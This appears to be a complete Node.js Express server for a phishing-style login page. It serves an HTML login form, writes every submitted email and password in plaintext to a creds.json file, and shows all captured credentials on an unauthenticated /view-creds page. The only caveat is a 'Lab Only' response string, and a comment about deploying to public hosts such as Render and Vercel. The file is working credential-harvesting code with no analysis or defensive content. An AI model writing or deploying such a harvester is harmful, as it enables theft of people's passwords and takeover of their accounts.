const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: true }));

// Route to serve the HTML login page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Store credentials
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  const entry = {
    email,
    password,
    timestamp: new Date().toISOString(),
  };

  let data = [];
  if (fs.existsSync("creds.json")) {
    data = JSON.parse(fs.readFileSync("creds.json"));
  }

  data.push(entry);
  fs.writeFileSync("creds.json", JSON.stringify(data, null, 2));
  res.send("Login Saved (Lab Only).");
});

// View stored credentials
app.get("/view-creds", (req, res) => {
  if (!fs.existsSync("creds.json")) return res.send("No records yet.");
  const data = JSON.parse(fs.readFileSync("creds.json"));
  res.send(`<pre>${JSON.stringify(data, null, 2)}</pre>`);
});

// Render/Renderfly/Vercel port fix
const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server running on port", port));
